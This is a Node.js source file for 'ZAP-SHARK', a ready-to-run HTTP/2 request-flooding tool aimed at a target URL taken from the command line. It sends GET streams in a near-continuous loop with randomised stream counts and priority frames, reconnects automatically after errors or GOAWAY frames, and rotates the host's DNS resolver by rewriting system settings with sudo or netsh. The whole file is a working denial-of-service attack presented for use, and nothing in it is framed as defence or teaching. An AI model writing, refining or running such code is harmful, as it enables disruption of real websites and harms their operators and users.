const http2 = require('http2');
const os = require('os');
const { exec } = require('child_process');
const dns = require('dns');

class ZAPSHARK {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.status = "ATTACKING";
        this.totalRequests = 0;
        this.currentRPS = 0;
        this.startTime = Date.now();
        this.requestsSinceLastCalc = 0;
        this.lastRpsCalc = Date.now();
        this.running = true;
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 3600000;
        this.maintenanceDuration = 600000;
        
        // DNS Rotation
        this.dnsServers = [
            '8.8.8.8',     // Google
            '1.1.1.1',     // Cloudflare
            '9.9.9.9',     // Quad9
            '208.67.222.222', // OpenDNS
            '76.76.2.0',   // Alternate DNS
            '94.140.14.14' // AdGuard
        ];
        this.currentDnsIndex = 0;
        this.dnsRotateInterval = 30000; // Rotate every 30 seconds
        
        // HTTP/2 Streams
        this.maxStreams = this.getRandomStreamCount();
        this.activeStreams = 0;
        
        this.client = null;
        this.attackInterval = null;
        this.isClientConnected = false;
    }

    getRandomStreamCount() {
        return Math.floor(Math.random() * 6) + 2; // 2-7 streams
    }

    rotateDNS() {
        this.currentDnsIndex = (this.currentDnsIndex + 1) % this.dnsServers.length;
        const newDns = this.dnsServers[this.currentDnsIndex];
        
        // Set DNS for OS (requires admin on some systems)
        try {
            if (os.platform() === 'win32') {
                exec(`netsh interface ip set dns name="Local Area Connection" source=static addr=${newDns}`, () => {});
            } else {
                exec(`echo "nameserver ${newDns}" | sudo tee /etc/resolv.conf`, () => {});
            }
        } catch (err) {}
        
        // Force DNS cache flush
        dns.setServers([newDns]);
        
        console.log(`\n[*] DNS Rotated to: ${newDns}`);
    }

    async setupClient() {
        return new Promise((resolve) => {
            try {
                // Rotate DNS before connection
                this.rotateDNS();
                
                const options = {
                    // HTTP/2 Priority Settings
                    settings: {
                        headerTableSize: 4096,
                        enablePush: false,
                        initialWindowSize: 65535,
                        maxFrameSize: 16384,
                        maxConcurrentStreams: this.maxStreams,
                        maxHeaderListSize: 32768
                    }
                };
                
                this.client = http2.connect(this.targetUrl, options);
                
                this.client.on('connect', () => {
                    this.isClientConnected = true;
                    this.maxStreams = this.getRandomStreamCount();
                    console.log(`[*] HTTP/2 Connected - Max Streams: ${this.maxStreams}`);
                    resolve(true);
                });
                
                this.client.on('error', (err) => {
                    this.isClientConnected = false;
                    setTimeout(() => this.setupClient(), 1000);
                    resolve(false);
                });
                
                this.client.on('goaway', () => {
                    this.isClientConnected = false;
                    setTimeout(() => this.setupClient(), 1000);
                });
                
            } catch (err) {
                this.isClientConnected = false;
                setTimeout(() => this.setupClient(), 1000);
                resolve(false);
            }
        });
    }

    sendRequest() {
        if (!this.client || !this.isClientConnected || this.activeStreams >= this.maxStreams) {
            return;
        }

        try {
            this.activeStreams++;
            
            // Random priority for HTTP/2 frames (1-256, higher = more priority)
            const randomPriority = Math.floor(Math.random() * 256) + 1;
            
            const req = this.client.request({
                ':method': 'GET',
                ':path': '/',
                ':scheme': 'https',
                ':authority': new URL(this.targetUrl).hostname
            }, {
                weight: randomPriority,
                exclusive: false,
                parent: 0
            });
            
            // Set HTTP/2 priority frame
            req.priority({
                weight: randomPriority,
                exclusive: Math.random() > 0.5,
                parent: 0
            });
            
            req.on('response', (headers) => {
                req.destroy();
                this.activeStreams--;
            });
            
            req.on('error', () => {
                req.destroy();
                this.activeStreams--;
            });
            
            req.on('close', () => {
                this.totalRequests++;
                this.requestsSinceLastCalc++;
                this.activeStreams = Math.max(0, this.activeStreams - 1);
            });
            
            req.end();
            
        } catch (err) {
            this.totalRequests++;
            this.requestsSinceLastCalc++;
            this.activeStreams = Math.max(0, this.activeStreams - 1);
        }
    }

    calculateRPS() {
        const now = Date.now();
        const timeDiff = (now - this.lastRpsCalc) / 1000;
        
        if (timeDiff >= 0.9) {
            this.currentRPS = this.requestsSinceLastCalc / timeDiff;
            this.requestsSinceLastCalc = 0;
            this.lastRpsCalc = now;
        }
    }

    formatRuntime() {
        const runtime = Math.floor((Date.now() - this.startTime) / 1000);
        const minutes = Math.floor(runtime / 60) % 60;
        const seconds = runtime % 60;
        return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
    }

    updateDisplay() {
        this.calculateRPS();
        
        process.stdout.write(`\rZAP-SHARK: (${this.formatRuntime()}) | (${this.status}) ` +
                           `TOTAL: ${this.totalRequests} | ` +
                           `RPS: ${this.currentRPS.toFixed(1)} | ` +
                           `STREAMS: ${this.activeStreams}/${this.maxStreams} | ` +
                           `DNS: ${this.dnsServers[this.currentDnsIndex].split('.')[0]}`);
    }

    flushDNS() {
        if (os.platform() === 'win32') {
            exec('ipconfig /flushdns', () => {});
        } else {
            exec('sudo dscacheutil -flushcache || sudo systemd-resolve --flush-caches || echo "DNS flush attempted"', () => {});
        }
    }

    flushSockets() {
        this.isClientConnected = false;
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
            this.client = null;
        }
        setTimeout(() => this.setupClient(), 100);
    }

    checkMaintenance() {
        const currentTime = Date.now();
        const timeSinceLastMaintenance = currentTime - this.lastMaintenance;
        
        if (timeSinceLastMaintenance >= this.maintenanceInterval && this.status === "ATTACKING") {
            console.log('\n=== MAINTENANCE STARTED ===');
            this.status = "PAUSED";
            
            this.flushDNS();
            this.flushSockets();
            
            if (this.attackInterval) {
                clearInterval(this.attackInterval);
                this.attackInterval = null;
            }
            
            setTimeout(() => {
                this.resumeAttack();
            }, this.maintenanceDuration);
            
            this.lastMaintenance = currentTime;
        }
    }

    resumeAttack() {
        this.status = "ATTACKING";
        this.lastMaintenance = Date.now();
        console.log('\n=== MAINTENANCE COMPLETED - RESUMING ATTACK ===');
        this.startAttack();
    }

    startAttack() {
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        
        this.attackInterval = setInterval(() => {
            if (this.status === "ATTACKING") {
                this.sendRequest();
                this.updateDisplay();
            }
        }, 0.1);
    }

    async start() {
        console.log("=== ZAP-SHARK ENHANCED ===");
        console.log("Protocol: HTTP/2 + DNS Rotation + Priority Frames");
        console.log("Streams: Dynamic 2-7 | DNS: 6 Servers");
        console.log("Target:", this.targetUrl);
        console.log("=".repeat(50));
        
        await this.setupClient();
        
        this.startAttack();
        
        // Maintenance checker
        setInterval(() => {
            this.checkMaintenance();
        }, 1000);
        
        // DNS rotation every 30 seconds
        setInterval(() => {
            if (this.status === "ATTACKING") {
                this.rotateDNS();
                this.maxStreams = this.getRandomStreamCount();
            }
        }, this.dnsRotateInterval);
        
        // Auto-reconnect
        setInterval(() => {
            if (!this.isClientConnected && this.status === "ATTACKING") {
                this.setupClient();
            }
        }, 2000);
        
        process.on('SIGINT', () => {
            this.stop();
        });
    }

    stop() {
        this.running = false;
        if (this.attackInterval) {
            clearInterval(this.attackInterval);
        }
        if (this.client) {
            try {
                this.client.destroy();
            } catch (err) {}
        }
        console.log('\n=== ZAP-SHARK STOPPED ===');
        process.exit(0);
    }
}

// Usage
const target = process.argv[2] || 'https://example.com';

if (!target.startsWith('https://')) {
    console.log('Error: Target must use HTTPS for HTTP/2');
    console.log('Usage: node zap-shark.js https://your-target.com');
    process.exit(1);
}

const shark = new ZAPSHARK(target);
shark.start().catch(err => {
    console.log('Failed to start:', err.message);
});
